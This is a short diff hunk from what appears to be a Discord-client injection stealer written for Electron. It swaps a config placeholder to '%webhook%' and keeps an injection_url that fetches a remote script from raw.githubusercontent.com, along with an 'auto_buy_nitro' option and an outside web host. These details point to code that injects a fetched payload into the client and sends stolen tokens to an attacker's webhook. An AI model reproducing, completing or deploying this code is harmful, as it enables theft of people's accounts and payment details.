@@ -6,7 +6,7 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-    key: '%key%',
+    key: '%webhook%',
     web: 'http://heil.com',
     auto_buy_nitro: false,
     injection_url: 'https://raw.githubusercontent.com/13shitposts/bin/main/test.js',
